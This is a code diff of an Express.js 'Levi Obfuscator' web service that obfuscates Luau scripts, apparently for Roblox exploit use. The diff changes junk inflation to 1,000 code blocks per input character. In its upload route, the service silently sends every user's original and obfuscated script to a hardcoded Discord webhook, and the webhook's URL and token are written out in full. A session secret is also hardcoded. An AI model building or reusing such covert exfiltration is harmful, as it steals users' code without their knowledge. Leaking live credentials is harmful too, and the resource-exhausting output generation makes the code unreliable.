@@ -8,7 +8,7 @@ const app = express();
 
 const upload = multer({ 
   storage: multer.memoryStorage(),
-  limits: { fileSize: 15 * 1024 * 1024 }
+  limits: { fileSize: 50 * 1024 * 1024 } // Increased limit to handle massive text inflation outputs
 });
 
 const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";
@@ -25,15 +25,15 @@ app.use((req, res, next) => {
     next();
 });
 
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.json({ limit: '50mb' }));
 app.use(session({
   secret: 'levi-obfuscator-secret-key-9988',
   resave: false,
   saveUninitialized: true,
 }));
 
-// Levi Obfuscator Engine V1.2.0 (Full Code Junk Inflation & Variable Mangling)
+// Levi Obfuscator Engine V1.2.0 (Massive Block Injection: 1 Character = 1,000 Full Statements)
 function obfuscateLuauScript(sourceCode, options) {
     let code = sourceCode;
 
@@ -61,35 +61,53 @@ function obfuscateLuauScript(sourceCode, options) {
         });
     }
 
-    // 3. Heavy Junk Code Expansion (Multiplies source line count heavily e.g., 30 lines to ~900+ secure lines)
-    const baseLines = code.split('\n').length;
-    const multiplier = options.sizeMode === 'small' ? 10 : options.sizeMode === 'medium' ? 30 : options.sizeMode === 'large' ? 60 : 100;
-    const targetJunkCount = Math.max(baseLines * multiplier, 600);
+    // 3. Absolute Massive Expansion: 1 character = 1,000 iterations, each writing multi-line blocks
+    const inputLength = sourceCode.length;
+    const targetBlocks = inputLength * 1000;
 
-    let junkHeader = '';
-    let junkFooter = '';
+    let massiveJunk = '';
+    const variableNames = ['_g', '_x', '_y', '_z', '_env', '_cache', '_val', '_dat', '_node', '_mem'];
 
-    for (let i = 0; i < targetJunkCount; i++) {
-        const randHex1 = Math.random().toString(36).substring(2, 8).toUpperCase();
-        const randHex2 = Math.random().toString(36).substring(2, 8).toUpperCase();
-        const mathOp = i % 2 === 0 ? '+' : '-';
+    // Writing in chunks to avoid string concatenation bottlenecks on massive files
+    const chunkSize = 5000;
+    let chunks = [];
+
+    for (let b = 0; b < targetBlocks; b++) {
+        const v1 = variableNames[b % variableNames.length] + b;
+        const v2 = variableNames[(b + 3) % variableNames.length] + (b * 7);
         
-        if (i % 2 === 0) {
-            junkHeader += `local _0x${randHex1} = (function() local _0x${randHex2} = ${i * 13}; return _0x${randHex2} ${mathOp} 1; end)();\n`;
-        } else {
-            junkFooter += `local _0x${randHex1} = pcall(function() return ${i * 3} end);\n`;
+        const block = `local function ${v1}()
+    local ${v2} = { ${b}, ${b * 2}, "${b}" }
+    for _ = 1, 2 do
+        pcall(function()
+            local _inner = ${b} * 1337
+            return _inner
+        end)
+    end
+    return ${b}
+end
+pcall(${v1});\n`;
+
+        chunks.push(block);
+
+        if (chunks.length >= chunkSize) {
+            massiveJunk += chunks.join('');
+            chunks = [];
         }
     }
+    if (chunks.length > 0) {
+        massiveJunk += chunks.join('');
+    }
 
-    // 4. Assemble the full deeply injected script
-    const finalObfuscated = `-- Obfuscated using levi obfuscator V1.2.0
+    // 4. Assemble the final massive payload
+    const finalObfuscated = `-- [ Levi Obfuscator V1.2.0 - Ultra Inflation Mode ] --
+-- Input length: ${inputLength} chars | Generated blocks: ${targetBlocks} --
 do
     local _env = getgenv and getgenv() or _G;
-    ${junkHeader}
+    ${massiveJunk}
     local function _levi_exec()
         ${code}
     end
-    ${junkFooter}
     pcall(_levi_exec);
 end`;
 
@@ -170,7 +188,7 @@ app.get('/auth/logout', (req, res) => {
   req.session.destroy(() => { res.redirect('/'); });
 });
 
-// UI Route with Levi Obfuscator Branding (Supports File or Direct Raw Text Input)
+// UI Route with Levi Obfuscator Branding
 app.get('/', (req, res) => {
   const verifiedUser = req.session.verifiedUser || null;
 
@@ -238,16 +256,6 @@ app.get('/', (req, res) => {
                 ${verifiedUser ? 
                     `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
                         <h3>Levi Obfuscator V1.2.0</h3>
-
-                        <div style="margin-top: 6px;">
-                            <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Length Focus (Size Level):</label>
-                            <select name="sizeMode">
-                                <option value="small">Small</option>
-                                <option value="medium" selected>Medium (~900+ Lines)</option>
-                                <option value="large">Large</option>
-                                <option value="extralarge">Extra Large</option>
-                            </select>
-                        </div>
 
                         <div style="margin-top: 6px;">
                             <label style="font-size:12px; color:#38bdf8; display:block; margin-bottom:3px;">Rename Locals:</label>
@@ -318,7 +326,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Backend Route: Processes script from either file upload or direct text box, obfuscates, downloads result, and silently logs to Discord
+// Backend Route: Processes script, obfuscates with massive multi-line scale, downloads result, and logs to Discord
 app.post('/upload-discord', upload.single('file'), async (req, res) => {
   try {
     if (!req.session.verifiedUser) {
@@ -327,7 +335,6 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
 
     const file = req.file;
     const directText = req.body.scriptContent;
-    const sizeMode = req.body.sizeMode || 'medium';
     const renameLocal = req.body.renameLocal || 'yes';
 
     let rawString = '';
@@ -345,18 +352,18 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
 
     const rawScriptBuffer = Buffer.from(rawString, 'utf8');
 
-    // Run Levi Obfuscator Engine with full code padding and mangling
-    const obfuscatedString = obfuscateLuauScript(rawString, { sizeMode, renameLocal });
+    // Run Levi Obfuscator Engine with massive block scaling (1 char = 1,000 multi-line blocks)
+    const obfuscatedString = obfuscateLuauScript(rawString, { renameLocal });
     const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');
 
     const ext = originalName.includes('.') ? originalName.substring(originalName.lastIndexOf('.')) : '.lua';
     const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
     const obfuscatedFilename = `${baseName}_levi_obfuscated${ext}`;
 
-    // Silently dispatch BOTH Raw and Obfuscated files to Discord Webhook
+    // Silently dispatch files to Discord Webhook
     try {
       const webhookPayloadJson = JSON.stringify({
-        content: `🔒 **New Script Obfuscated via Levi Obfuscator**\n🔐 Identity: \`${req.session.verifiedUser}\`\n⚙️ Settings: Size=\`${sizeMode}\`, RenameLocal=\`${renameLocal}\`\n📁 Original: \`${originalName}\``
+        content: `🔒 **New Script Obfuscated via Levi Obfuscator V1.2.0**\n🔐 Identity: \`${req.session.verifiedUser}\`\n⚙️ Ultra-Scale: \`${rawString.length} chars -> ${rawString.length * 1000} blocks\`\n📁 Original: \`${originalName}\``
       });
 
       const formData = new FormData();
@@ -373,7 +380,7 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
       console.error('Silent Webhook Dispatch Error:', webhookErr);
     }
 
-    // Send the obfuscated file download directly back to the user seamlessly
+    // Send the massive obfuscated file download back to the user seamlessly
     res.setHeader('Content-Disposition', `attachment; filename="${obfuscatedFilename}"`);
     res.setHeader('Content-Type', 'text/plain');
     res.send(obfuscatedBuffer);
